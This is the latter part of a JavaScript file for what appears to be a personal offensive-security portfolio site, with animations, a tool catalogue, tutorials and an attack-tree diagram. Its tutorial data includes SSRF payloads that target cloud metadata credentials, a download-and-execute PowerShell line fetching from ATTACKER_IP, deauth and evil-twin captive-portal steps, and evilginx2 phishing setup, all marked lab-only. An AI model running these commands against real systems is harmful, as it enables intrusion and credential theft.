        ctx.arc(p.x, p.y, p.size * 2, 0, Math.PI * 2);
        ctx.fillStyle = p.color;
        ctx.globalAlpha = p.life * 0.2;
        ctx.fill();
      }
      ctx.globalAlpha = 1;
    }
    requestAnimationFrame(loop);
  }

  if (!matchMedia("(prefers-reduced-motion:reduce)").matches) loop();
})();

/* ============================================================
   SCROLL PROGRESS BAR
   ============================================================ */
(function () {
  const bar = document.createElement("div");
  bar.id = "scroll-progress";
  const fill = document.createElement("div");
  fill.id = "scroll-progress-bar";
  bar.appendChild(fill);
  document.body.appendChild(bar);
  window.addEventListener("scroll", () => {
    const max = document.body.scrollHeight - window.innerHeight;
    fill.style.width = (window.scrollY / max) * 100 + "%";
  });
})();

/* DOM tree replaced — new top-down SVG tree injected below */

/* ============================================================
   MORE TOOLS (extend TOOLS array before render)
   ============================================================ */
// Inject additional tools
TOOLS.push(
  {
    n: "Nikto",
    c: "web",
    d: "Open-source web server scanner. Finds dangerous files and config issues.",
    t: "Web",
    s: "learn",
    st: "learning",
  },
  {
    n: "Maltego",
    c: "recon",
    d: "Visual link analysis and OSINT graph mapping.",
    t: "OSINT",
    s: "learn",
    st: "learning",
  },
  {
    n: "sqlmap",
    c: "web",
    d: "Automatic SQL injection detection and exploitation engine.",
    t: "Web",
    s: "learn",
    st: "configured",
  },
  {
    n: "theHarvester",
    c: "recon",
    d: "OSINT email, subdomain, IP, URL harvesting from public sources.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
  {
    n: "Shodan CLI",
    c: "recon",
    d: "Search internet-connected devices — find exposed services.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
  {
    n: "Responder",
    c: "exploit",
    d: "LLMNR/NBT-NS poisoner. Captures NTLMv2 hashes on the wire.",
    t: "AD/Net",
    s: "learn",
    st: "learning",
  },
  {
    n: "CrackMapExec",
    c: "exploit",
    d: "Swiss army knife for AD environments — SMB, WinRM, LDAP.",
    t: "AD",
    s: "learn",
    st: "learning",
  },
  {
    n: "Evil-WinRM",
    c: "exploit",
    d: "WinRM shell for post-exploitation. Uploads, downloads, PS sessions.",
    t: "AD",
    s: "learn",
    st: "learning",
  },
  {
    n: "Subfinder",
    c: "recon",
    d: "Fast passive subdomain enumeration from multiple sources.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
  {
    n: "Nuclei",
    c: "web",
    d: "Template-based vulnerability scanner — 7000+ community templates.",
    t: "Web",
    s: "learn",
    st: "learning",
  },
  {
    n: "Katana",
    c: "web",
    d: "Next-gen web crawler for attack surface discovery.",
    t: "Web",
    s: "learn",
    st: "learning",
  },
  {
    n: "enum4linux",
    c: "recon",
    d: "Linux equivalent of Enum.exe for Windows SMB shares, users, groups.",
    t: "Recon",
    s: "ok",
    st: "configured",
  },
);

// Re-render arsenal grid after push
(function () {
  const grid = document.getElementById("arsenalGrid");
  if (grid)
    grid.innerHTML = TOOLS.map(
      (t) => `
    <div class="panel tool" data-cat="${t.c}">
      <div class="tname">${t.n}</div>
      <div class="tdesc">${t.d}</div>
      <div class="tmeta"><span class="tag">${t.t}</span><span class="tstat ${t.s}">${t.st}</span></div>
    </div>`,
    ).join("");
})();

/* ============================================================
   EXTRA TUTORIALS DATA
   ============================================================ */
// Inject extra tutorials into TUTORIALS object
TUTORIALS.recon.push({
  title: "Shodan Recon & OSINT",
  diff: "int",
  desc: "Use Shodan, theHarvester and crt.sh to map an organisation's exposed attack surface from outside the network.",
  steps: [
    {
      h: "theHarvester email & subdomain harvest",
      p: "Passive OSINT — no active probing.",
      code: `theHarvester -d target.com -b all -l 200\n# Sources: Google, Bing, LinkedIn, crt.sh, Hunter\n# Outputs: emails, subdomains, IP ranges`,
    },
    {
      h: "Certificate transparency with crt.sh",
      p: "Find all TLS certs ever issued for the domain.",
      code: `curl -s "https://crt.sh/?q=%.target.com&output=json" \\\n  | jq -r '.[].name_value' | sort -u | grep -v '*'`,
    },
    {
      h: "Shodan org & IP lookup",
      p: "Find internet-facing services before ever touching the target.",
      code: `shodan search "org:\"Target Corp\""\nshodan host 93.184.216.34\n# Look for: open RDP (3389), exposed admin panels, old services`,
    },
    {
      h: "Subfinder passive discovery",
      p: "Aggregate passive subdomain sources.",
      code: `subfinder -d target.com -o subs.txt\n# Then resolve live ones:\ncat subs.txt | httpx -status-code -title -tech-detect`,
    },
  ],
  tags: ["Shodan", "OSINT", "theHarvester"],
  warn: "Passive recon only — no active scanning against systems you don't own.",
});

TUTORIALS.webpwn.push({
  title: "SSRF — Server-Side Request Forgery",
  diff: "adv",
  desc: "Methodology for finding and exploiting SSRF in PortSwigger labs. SSRF can reach internal metadata services, internal APIs, and cloud IMDS.",
  steps: [
    {
      h: "Find SSRF entry points",
      p: "Look for URLs, file paths, or domain names submitted to the server.",
      code: `# Common SSRF parameters:\n# url=, path=, file=, src=, image=, redirect=, next=\n# Test with Burp Collaborator or interactsh\nhttp://target.com/fetch?url=https://BURP_COLLAB_URL`,
    },
    {
      h: "Test internal network access",
      p: "Reach localhost and internal RFC-1918 ranges.",
      code: `# Localhost variants:\nhttp://127.0.0.1/admin\nhttp://localhost:8080\nhttp://[::1]/\nhttp://0177.0.0.1/ # octal\nhttp://2130706433/ # decimal IP`,
    },
    {
      h: "Cloud IMDS exfil",
      p: "AWS EC2 metadata is the crown jewel of SSRF.",
      code: `# AWS IMDSv1 (no token required):\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n# GCP:\nhttp://metadata.google.internal/computeMetadata/v1/instance/`,
    },
    {
      h: "Bypass filters",
      p: "Server-side URL parsers are frequently bypassable.",
      code: `# DNS rebinding, redirects:\nhttp://spoofed.domain.com -> 127.0.0.1\n# IP encoding:\nhttp://0x7f000001\nhttp://①②⑦.⓪.⓪.①\n# URL scheme:\nfile:///etc/passwd\ndict://127.0.0.1:6379/INFO`,
    },
  ],
  tags: ["SSRF", "Burp", "Cloud"],
  warn: "PortSwigger academy labs only — or targets with explicit written authorisation.",
});

TUTORIALS.privesc.push({
  title: "Windows PrivEsc — Checklist",
  diff: "adv",
  desc: "Systematic escalation from a low-privilege Windows shell. Start with quick wins, then move to deeper vectors.",
  steps: [
    {
      h: "Basic enumeration",
      p: "Understand your position and the system.",
      code: `whoami /all\nsysteminfo | findstr /B /C:"OS Name" /C:"OS Version"\nnet user\nnet localgroup administrators`,
    },
    {
      h: "AlwaysInstallElevated",
      p: "Check if MSI files always run as SYSTEM.",
      code: `# Registry check:\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# If both = 1: use msfvenom MSI payload`,
    },
    {
      h: "Scheduled tasks & services",
      p: "Find writable service binaries or task scripts.",
      code: `# Weak service permissions:\nsc qc "vulnerable service"\nicacls "C:\\path\\to\\service.exe"\n\n# Scheduled tasks:\nschtasks /query /fo LIST /v | findstr "Task Name\\|Run As\\|Status"`,
    },
    {
      h: "Run WinPEAS",
      p: "Automated multi-vector enumeration.",
      code: `# Upload WinPEAS:\ncurl http://ATTACKER_IP/winpeas.exe -o C:\\Users\\Public\\wp.exe\nC:\\Users\\Public\\wp.exe\n# OR PowerShell:\niex(new-object net.webclient).downloadstring('http://ATTACKER_IP/winPEAS.ps1')`,
    },
  ],
  tags: ["PrivEsc", "WinPEAS", "Windows"],
  warn: "CTF and authorised lab environments only.",
});

TUTORIALS.wireless.push({
  title: "Deauth Attack & Evil Twin Setup",
  diff: "adv",
  desc: "Theoretical walkthrough of deauthentication and Evil Twin concepts. For home lab use on your own equipment only.",
  steps: [
    {
      h: "Deauth a client (your own AP)",
      p: "Force a re-association to capture a fresh handshake.",
      code: `# Requires monitor mode (airmon-ng start wlan0)\n# DO THIS ONLY ON YOUR OWN NETWORK\nsudo aireplay-ng --deauth 10 \\\n  -a [YOUR_AP_BSSID] \\\n  -c [YOUR_DEVICE_MAC] \\\n  wlan0mon`,
    },
    {
      h: "Evil Twin concept",
      p: "Spin up a rogue AP with identical SSID (lab only).",
      code: `# hostapd config for your own lab AP:\nssid=MyTestNetwork\nchannel=6\nhw_mode=g\n# Add DHCP server:\ndnsmasq --interface=wlan1 \\\n  --dhcp-range=192.168.100.10,192.168.100.50`,
    },
    {
      h: "Captive portal redirect",
      p: "Credential phishing page served on evil twin.",
      code: `# iptables redirect all HTTP to captive portal:\niptables -t nat -A PREROUTING -p tcp --dport 80 \\\n  -j DNAT --to-destination 192.168.100.1:8080\n# Serve page:\npython3 -m http.server 8080`,
    },
  ],
  tags: ["Wireless", "Deauth", "Evil Twin"],
  warn: "STRICTLY your own equipment in a private lab. Evil twin attacks on others' networks are criminal.",
});

// Add more field notes
Object.assign(NOTES, {
  social: {
    title: "// Social Engineering",
    meta: "Awareness notes — how attacks exploit human behaviour",
    secs: [
      {
        h: "Pretexting Scenarios",
        list: [
          "IT helpdesk impersonation — password reset requests",
          "Vendor/supplier impersonation via email",
          "C-suite fraud (CEO fraud) for wire transfers",
          "Survey phishing — data collection under guise of research",
        ],
      },
      {
        h: "Phishing Infrastructure",
        code: `# GoPhish quick setup:\ngophish\n# Default: https://127.0.0.1:3333\n# Username: admin / password shown in stdout\n# Build templates, track opens, link clicks\n\n# evilginx2 (adversary-in-the-middle):\nevilginx2 -p /usr/share/evilginx/phishlets/`,
      },
      {
        h: "Detection Heuristics",
        list: [
          "Urgency + authority = phishing signal",
          "Check sender domain carefully (typosquatting)",
          "Hover links before clicking",
          "Enable DMARC/DKIM/SPF on your own domains",
        ],
      },
    ],
  },
  forensics: {
    title: "// Digital Forensics",
    meta: "Evidence preservation and analysis — defensive side",
    secs: [
      {
        h: "Disk Imaging",
        code: `# Image with dd:\nsudo dd if=/dev/sda of=/mnt/usb/evidence.img bs=4M status=progress\n# Verify integrity:\nsha256sum /dev/sda > hash.txt\nsha256sum evidence.img >> hash.txt\ndiff hash.txt\n\n# Preferred: dcfldd (with logging)\nsudo dcfldd if=/dev/sda of=evidence.img bs=512 hash=sha256 log=dcfldd.log`,
      },
      {
        h: "Memory Acquisition",
        code: `# Linux — LiME (loadable kernel module):\nsudo insmod lime-$(uname -r).ko "path=/mnt/memory.lime format=lime"\n\n# Windows — WinPmem:\nwinpmem_x64.exe memory.raw`,
      },
      {
        h: "Log Analysis",
        code: `# Linux auth log:\ncat /var/log/auth.log | grep -i "failed\\|invalid\\|error"\ngrep "sshd" /var/log/auth.log | grep -v "Accepted\|Closed"\n\n# Find recently modified files:\nfind / -mtime -1 -type f 2>/dev/null | grep -v proc | head -50`,
      },
    ],
  },
});

// Re-render notes with extra tabs
(function () {
  const notenav = document.getElementById("notenav");
  const notebody = document.getElementById("notebody");
  if (!notenav || !notebody) return;
  notenav.innerHTML = Object.entries(NOTES)
    .map(
      ([k], idx) =>
        `<button class="ntab${idx === 0 ? " on" : ""}" data-n="${k}">${k.toUpperCase()}</button>`,
    )
    .join("");
  notebody.innerHTML = Object.entries(NOTES)
    .map(
      ([k, v], idx) => `
    <div class="npage${idx === 0 ? " on" : ""}" data-n="${k}">
      <h3>${v.title}</h3>
      <div class="nmeta">${v.meta}</div>
      ${v.secs.map((s) => `<div class="nsec"><h4>${s.h}</h4>${s.code ? `<div class="code-wrap"><pre class="code"><code>${s.code.replace(/</g, "&lt;")}</code></pre><button class="copy-btn" data-code="${encodeURIComponent(s.code)}">copy</button></div>` : ""}${s.list ? `<ul class="nlist">${s.list.map((li) => `<li>${li}</li>`).join("")}</ul>` : ""}</div>`).join("")}
    </div>`,
    )
    .join("");
  // re-bind tabs
  notenav.querySelectorAll(".ntab").forEach(
    (t) =>
      (t.onclick = () => {
        notenav
          .querySelectorAll(".ntab")
          .forEach((x) => x.classList.remove("on"));
        t.classList.add("on");
        notebody
          .querySelectorAll(".npage")
          .forEach((p) =>
            p.classList.toggle("on", p.dataset.n === t.dataset.n),
          );
      }),
  );
  bindCopy(notebody);
})();

/* ============================================================
   TUTORIAL CATEGORY COUNT UPDATE
   ============================================================ */
(function () {
  document.querySelectorAll(".tcat").forEach((b) => {
    const cat = b.dataset.cat;
    const count = (TUTORIALS[cat] || []).length;
    const sp = b.querySelector(".tcat-count");
    if (sp) sp.textContent = count;
  });
  // also re-render current active cat
  const active = document.querySelector(".tcat.on");
  if (active) active.click();
})();

/* ============================================================
   PARTICLE BURST on .rev entering viewport
   ============================================================ */
(function () {
  const reduce = matchMedia("(prefers-reduced-motion:reduce)").matches;
  if (reduce) return;
  let fired = new Set();
  const obs = new IntersectionObserver(
    (es) =>
      es.forEach((e) => {
        if (e.isIntersecting && !fired.has(e.target)) {
          fired.add(e.target);
          const rect = e.target.getBoundingClientRect();
          if (rect.width > 300) {
            // only on large elements
            spawnParticles(rect.left + rect.width * 0.5, rect.top, 6);
          }
        }
      }),
    { threshold: 0.15 },
  );
  document.querySelectorAll(".shead").forEach((el) => obs.observe(el));

  function spawnParticles(x, y, n) {
    const COLORS = ["#ff2d2d", "#00e5ff", "#39ff7e", "#bf5fff"];
    for (let i = 0; i < n; i++) {
      const el = document.createElement("div");
      el.className = "particle";
      const angle = Math.random() * Math.PI * 2;
      const dist = 20 + Math.random() * 80;
      el.style.cssText = `left:${x}px;top:${y}px;background:${COLORS[i % COLORS.length]};--px:${Math.cos(angle) * dist}px;--py:${Math.sin(angle) * dist - 30}px;animation-delay:${i * 0.05}s`;
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 700);
    }
  }
})();

/* ============================================================
   GLITCH TEXT every N seconds on hero title
   ============================================================ */
(function () {
  const el = document.querySelector(".hero-title .l2");
  if (!el || matchMedia("(prefers-reduced-motion:reduce)").matches) return;
  const original = el.textContent;
  const GLITCH_CHARS = "░▒▓█▌▐╬╫╪▲▼◆◇■□▪▫";
  function glitch() {
    let str = "";
    for (let i = 0; i < original.length; i++) {
      str +=
        Math.random() < 0.3
          ? GLITCH_CHARS[Math.floor(Math.random() * GLITCH_CHARS.length)]
          : original[i];
    }
    el.textContent = str;
    setTimeout(() => {
      let str2 = "";
      for (let i = 0; i < original.length; i++) {
        str2 +=
          Math.random() < 0.1
            ? GLITCH_CHARS[Math.floor(Math.random() * GLITCH_CHARS.length)]
            : original[i];
      }
      el.textContent = str2;
      setTimeout(() => {
        el.textContent = original;
      }, 80);
    }, 60);
    setTimeout(glitch, 3000 + Math.random() * 4000);
  }
  setTimeout(glitch, 2000);
})();

/* ============================================================
   TOP-DOWN ANIMATED ATTACK TREE — SVG with animated paths
   ============================================================ */
(function () {
  const btns = document.querySelectorAll(".atree-btn");
  const placeholder = document.getElementById("atreeSvg");
  if (!placeholder) return;

  // Create wrapper SVG
  const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  svg.id = "atreeTopDown";
  svg.setAttribute("xmlns", "http://www.w3.org/2000/svg");
  placeholder.parentNode.replaceChild(svg, placeholder);

  /* ---- Tree data: top-down hierarchy ---- */
  const TREES = {
    webapp: {
      label: "Web App Attack Chain",
      root: {
        id: "root",
        label: "TARGET",
        sub: "scope defined",
        color: "#ff2d2d",
        children: [
          {
            id: "recon",
            label: "RECON",
            sub: "passive & active",
            color: "#ff9900",
            children: [
              {
                id: "osint",
                label: "OSINT",
                sub: "crt.sh · shodan",
                color: "#00e5ff",
                children: [
                  {
                    id: "subdom",
                    label: "Subdomain Enum",
                    sub: "gobuster · subfinder",
                    color: "#00e5ff",
                    children: [],
                  },
                ],
              },
              {
                id: "spider",
                label: "Web Spider",
                sub: "katana · burp",
                color: "#00e5ff",
                children: [
                  {
                    id: "dirb",
                    label: "Dir Busting",
                    sub: "ffuf · gobuster",
                    color: "#00e5ff",
                    children: [],
                  },
                ],
              },
            ],
          },
          {
            id: "intercept",
            label: "INTERCEPT",
            sub: "burp suite pro",
            color: "#ff9900",
            children: [
              {
                id: "xss",
                label: "XSS",
                sub: "reflected · DOM · stored",
                color: "#bf5fff",
                children: [
                  {
                    id: "xss_impact",
                    label: "Session Hijack",
                    sub: "cookie theft",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
              {
                id: "sqli",
                label: "SQLi",
                sub: "manual · sqlmap",
                color: "#bf5fff",
                children: [
                  {
                    id: "sqli_impact",
                    label: "Data Exfil",
                    sub: "dump tables",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
              {
                id: "ssrf",
                label: "SSRF",
                sub: "internal · cloud IMDS",
                color: "#bf5fff",
                children: [
                  {
                    id: "ssrf_impact",
                    label: "Internal Access",
                    sub: "169.254.x.x",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
              {
                id: "idor",
                label: "IDOR / Auth",
                sub: "access control",
                color: "#bf5fff",
                children: [
                  {
                    id: "idor_impact",
                    label: "Privilege Escalation",
                    sub: "admin takeover",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
            ],
          },
        ],
      },
    },
    network: {
      label: "Network Pentest Chain",
      root: {
        id: "root",
        label: "TARGET NETWORK",
        sub: "scope authorised",
        color: "#ff2d2d",
        children: [
          {
            id: "footprint",
            label: "FOOTPRINTING",
            sub: "passive recon",
            color: "#ff9900",
            children: [
              {
                id: "osint2",
                label: "OSINT",
                sub: "whois · shodan",
                color: "#00e5ff",
                children: [],
              },
              {
                id: "nmap",
                label: "Nmap Scan",
                sub: "-sV -sS -p-",
                color: "#00e5ff",
                children: [
                  {
                    id: "svc",
                    label: "Service Enum",
                    sub: "banner grab · NSE",
                    color: "#00e5ff",
                    children: [],
                  },
                ],
              },
            ],
          },
          {
            id: "access",
            label: "INITIAL ACCESS",
            sub: "exploitation",
            color: "#ff9900",
            children: [
              {
                id: "exploit",
                label: "Exploit Search",
                sub: "searchsploit · msf",
                color: "#bf5fff",
                children: [
                  {
                    id: "shell",
                    label: "Shell Access",
                    sub: "reverse · bind",
                    color: "#bf5fff",
                    children: [],
                  },
                ],
              },
              {
                id: "creds",
                label: "Credential Attack",
                sub: "hydra · spray",
                color: "#bf5fff",
                children: [
                  {
                    id: "shell2",
                    label: "Authenticated",
                    sub: "ssh · smb",
                    color: "#bf5fff",
                    children: [],
                  },
                ],
              },
            ],
          },
          {
            id: "post",
            label: "POST-EXPLOIT",
            sub: "pivot & persist",
            color: "#ff9900",
            children: [
              {
                id: "privesc",
                label: "PrivEsc",
                sub: "linpeas · sudo -l",
                color: "#bf5fff",
                children: [
                  {
                    id: "root",
                    label: "ROOT / SYSTEM",
                    sub: "full control",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
              {
                id: "lateral",
                label: "Lateral Move",
                sub: "pass-the-hash",
                color: "#bf5fff",
                children: [
                  {
                    id: "persist",
                    label: "Persistence",
                    sub: "cron · services",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
            ],
          },
        ],
      },
    },
    wireless: {
      label: "Wireless Attack Chain",
      root: {
        id: "root",
        label: "WIRELESS TARGET",
        sub: "your own AP only",
        color: "#ff2d2d",
        children: [
          {
            id: "monitor",
            label: "MONITOR MODE",
            sub: "airmon-ng",
            color: "#ff9900",
            children: [
              {
                id: "scan",
                label: "AP Discovery",
                sub: "airodump-ng",
                color: "#00e5ff",
                children: [
                  {
                    id: "target",
                    label: "Target AP",
                    sub: "BSSID + channel",
                    color: "#00e5ff",
                    children: [],
                  },
                ],
              },
            ],
          },
          {
            id: "capture",
            label: "HANDSHAKE CAP",
            sub: "deauth + capture",
            color: "#ff9900",
            children: [
              {
                id: "crack",
                label: "Dict Crack",
                sub: "aircrack · hashcat",
                color: "#bf5fff",
                children: [
                  {
                    id: "psk",
                    label: "PSK Recovered",
                    sub: "WPA2 key",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
              {
                id: "evil",
                label: "Evil Twin",
                sub: "hostapd · dnsmasq",
                color: "#bf5fff",
                children: [
                  {
                    id: "creds2",
                    label: "Credential Harvest",
                    sub: "captive portal",
                    color: "#39ff7e",
                    children: [],
                  },
                ],
              },
            ],
          },
        ],
      },
    },
  };

  /* ---- Layout constants ---- */
  const NODE_W = 148,
    NODE_H = 44,
    H_GAP = 36,
    V_GAP = 80;
  const FONT = '"JetBrains Mono", monospace';
  const NS = "http://www.w3.org/2000/svg";

  /* ---- Tooltip ---- */
  let tooltip = document.getElementById("atree-tooltip");
  if (!tooltip) {
    tooltip = document.createElement("div");
    tooltip.id = "atree-tooltip";
    tooltip.style.cssText = `position:fixed;pointer-events:none;background:#111114;border:1px solid #2e2e34;
      padding:8px 12px;font-family:${FONT};font-size:.68rem;color:#e8e4d9;z-index:9000;
      opacity:0;transition:opacity .15s ease;max-width:200px;line-height:1.5;`;
    document.body.appendChild(tooltip);
  }

  /* ---- Tree layout: assign x,y to each node ---- */
  function layoutTree(node, depth, colOffset) {
    node.depth = depth;
    if (!node.children || node.children.length === 0) {
      node.width = 1;
      node.col = colOffset;
      return 1;
    }
    let totalCols = 0;
    node.children.forEach((child) => {
      child.parentCol = colOffset + totalCols;
      totalCols += layoutTree(child, depth + 1, colOffset + totalCols);
    });
    node.width = totalCols;
    node.col = colOffset + (totalCols - 1) / 2; // centre over children
    return totalCols;
  }

  function assignPositions(node, colUnit) {
    node.x = node.col * colUnit + colUnit / 2 - NODE_W / 2;
    node.y = node.depth * (NODE_H + V_GAP) + 24;
    if (node.children)
      node.children.forEach((c) => assignPositions(c, colUnit));
  }

  function collectAll(node, arr) {
    arr.push(node);
    if (node.children) node.children.forEach((c) => collectAll(c, arr));
    return arr;
  }

  function collectEdges(node, edges) {
    if (node.children)
      node.children.forEach((c) => {
        edges.push({ from: node, to: c });
        collectEdges(c, edges);
      });
    return edges;
  }

  /* ---- Animated dashed path draw ---- */
  function animatePath(path, delay) {
    const len = path.getTotalLength();
    path.style.strokeDasharray = len;
    path.style.strokeDashoffset = len;
    path.style.transition = "none";
    path.getBoundingClientRect();
    path.style.transition = `stroke-dashoffset 0.5s ease ${delay}s`;
    path.style.strokeDashoffset = "0";
  }

  /* ---- Animated node entrance ---- */
  function animateNode(g, delay) {
    g.style.opacity = "0";
    g.style.transform = "translateY(-10px)";
    g.style.transition = "none";
    g.getBoundingClientRect();
    g.style.transition = `opacity 0.3s ease ${delay}s, transform 0.3s ease ${delay}s`;
    g.style.opacity = "1";
    g.style.transform = "none";
  }

  /* ---- Render ---- */
  function render(key) {
    const tree = TREES[key];
    if (!tree) return;
    svg.innerHTML = "";

    const root = JSON.parse(JSON.stringify(tree.root)); // deep clone to avoid mutation
    const totalCols = layoutTree(root, 0, 0);

    // Compute SVG dimensions
    const colUnit = Math.max(
      NODE_W + H_GAP,
      (svg.parentElement.clientWidth - 40) / Math.max(totalCols, 1),
    );
    const svgW = Math.max(
      totalCols * colUnit,
      svg.parentElement.clientWidth - 40,
    );
    const allNodes = collectAll(root, []);
    const maxDepth = Math.max(...allNodes.map((n) => n.depth));
    const svgH = (maxDepth + 1) * (NODE_H + V_GAP) + 60;

    svg.setAttribute("viewBox", `0 0 ${svgW} ${svgH}`);
    svg.setAttribute("width", svgW);
    svg.setAttribute("height", svgH);

    assignPositions(root, colUnit);

    const allEdges = collectEdges(root, []);
    const edgeGroup = document.createElementNS(NS, "g");
    const nodeGroup = document.createElementNS(NS, "g");
    svg.appendChild(edgeGroup);
    svg.appendChild(nodeGroup);

    // Draw edges first (animated paths)
    let edgeIdx = 0;
    allEdges.forEach(({ from, to }) => {
      const x1 = from.x + NODE_W / 2;
      const y1 = from.y + NODE_H;
      const x2 = to.x + NODE_W / 2;
      const y2 = to.y;
      const midY = (y1 + y2) / 2;

      const path = document.createElementNS(NS, "path");
      path.setAttribute(
        "d",
        `M ${x1} ${y1} C ${x1} ${midY}, ${x2} ${midY}, ${x2} ${y2}`,
      );
      path.setAttribute("fill", "none");
      path.setAttribute("stroke", from.color || "#2e2e34");
      path.setAttribute("stroke-width", "1.5");
      path.setAttribute("opacity", "0.4");
      edgeGroup.appendChild(path);

      // Animate path draw
      setTimeout(() => animatePath(path, 0), 50 + edgeIdx * 80);
      edgeIdx++;
    });

    // Draw nodes
    allNodes.forEach((n, ni) => {
      const g = document.createElementNS(NS, "g");
      g.style.cursor = "pointer";

      // Background rect
      const rect = document.createElementNS(NS, "rect");
      rect.setAttribute("x", n.x);
      rect.setAttribute("y", n.y);
      rect.setAttribute("width", NODE_W);
      rect.setAttribute("height", NODE_H);
      rect.setAttribute("fill", "#0d0d0f");
      rect.setAttribute("stroke", n.color || "#2e2e34");
      rect.setAttribute("stroke-width", "1.5");
      rect.setAttribute("rx", "2");

      // Left accent bar
      const bar = document.createElementNS(NS, "rect");
      bar.setAttribute("x", n.x);
      bar.setAttribute("y", n.y);
      bar.setAttribute("width", "3");
      bar.setAttribute("height", NODE_H);
      bar.setAttribute("fill", n.color || "#2e2e34");
      bar.setAttribute("rx", "1");

      // Label
      const label = document.createElementNS(NS, "text");
      label.setAttribute("x", n.x + NODE_W / 2 + 4);
      label.setAttribute("y", n.y + (n.sub ? 17 : 26));
      label.setAttribute("text-anchor", "middle");
      label.setAttribute("font-family", FONT);
      label.setAttribute("font-size", "11");
      label.setAttribute("font-weight", "700");
      label.setAttribute("letter-spacing", "0.5");
      label.setAttribute("fill", n.color || "#e8e4d9");
      label.textContent = n.label;

      g.appendChild(rect);
      g.appendChild(bar);
      g.appendChild(label);

      // Sub label
      if (n.sub) {
        const sub = document.createElementNS(NS, "text");
        sub.setAttribute("x", n.x + NODE_W / 2 + 4);
        sub.setAttribute("y", n.y + 31);
        sub.setAttribute("text-anchor", "middle");
        sub.setAttribute("font-family", FONT);
        sub.setAttribute("font-size", "9");
        sub.setAttribute("fill", "#67655e");
        sub.setAttribute("letter-spacing", "0.3");
        sub.textContent = n.sub;
        g.appendChild(sub);
      }

      // Hover glow rect (hidden by default)
      const glow = document.createElementNS(NS, "rect");
      glow.setAttribute("x", n.x - 3);
      glow.setAttribute("y", n.y - 3);
      glow.setAttribute("width", NODE_W + 6);
      glow.setAttribute("height", NODE_H + 6);
      glow.setAttribute("fill", "none");
      glow.setAttribute("stroke", n.color || "#ff2d2d");
      glow.setAttribute("stroke-width", "1");
      glow.setAttribute("opacity", "0");
      glow.setAttribute("rx", "3");
      glow.style.transition = "opacity .15s ease";
      g.appendChild(glow);

      // Hover interactions
      g.addEventListener("mouseenter", (e) => {
        glow.setAttribute("opacity", "0.5");
        rect.setAttribute("fill", "#18181c");
        tooltip.style.opacity = "1";
        tooltip.innerHTML = `<b style="color:${n.color}">${n.label}</b><br>${n.sub || ""}`;
        tooltip.style.left = e.clientX + 14 + "px";
        tooltip.style.top = e.clientY - 10 + "px";
      });
      g.addEventListener("mousemove", (e) => {
        tooltip.style.left = e.clientX + 14 + "px";
        tooltip.style.top = e.clientY - 10 + "px";
      });
      g.addEventListener("mouseleave", () => {
        glow.setAttribute("opacity", "0");
        rect.setAttribute("fill", "#0d0d0f");
        tooltip.style.opacity = "0";
      });

      nodeGroup.appendChild(g);
      // Staggered entrance
      setTimeout(() => animateNode(g, 0), 30 + ni * 60);
    });
  }

  btns.forEach(
    (b) =>
      (b.onclick = () => {
        btns.forEach((x) => x.classList.remove("on"));
        b.classList.add("on");
        render(b.dataset.tree);
      }),
  );

  // Initial render
  render("webapp");

  // Re-render on resize
  let resizeTimer;
  window.addEventListener("resize", () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
      const on = document.querySelector(".atree-btn.on");
      if (on) render(on.dataset.tree);
    }, 120);
  });
})();

/* ===== fsociety entry sound — plays once on first interaction ===== */
(function () {
  const snd = new Audio("fsociety_enter.mp3");
  snd.volume = 0.4;
  snd.loop = true; // <-- repeat forever
  let started = false;
  function fire() {
    if (started) return;
    started = true;
    snd.play().catch(() => {});
    window.removeEventListener("pointerdown", fire);
    window.removeEventListener("keydown", fire);
  }
  const skip = document.getElementById("bootSkip");
  if (skip) skip.addEventListener("click", fire);
  window.addEventListener("pointerdown", fire);
  window.addEventListener("keydown", fire);
})();

/* ===== THEME TOGGLE ===== */
(function () {
  const root = document.documentElement,
    btn = document.getElementById("themeToggle");
  if (!btn) return;
  function paint() {
    const light = root.dataset.theme === "light";
    btn.innerHTML = light ? "☀ light" : "☾ dark";
  }
  paint();
  btn.addEventListener("click", () => {
    root.dataset.theme = root.dataset.theme === "light" ? "dark" : "light";
    try {
      localStorage.setItem("fsoc_theme", root.dataset.theme);
    } catch (e) {}
    paint();
  });
})();
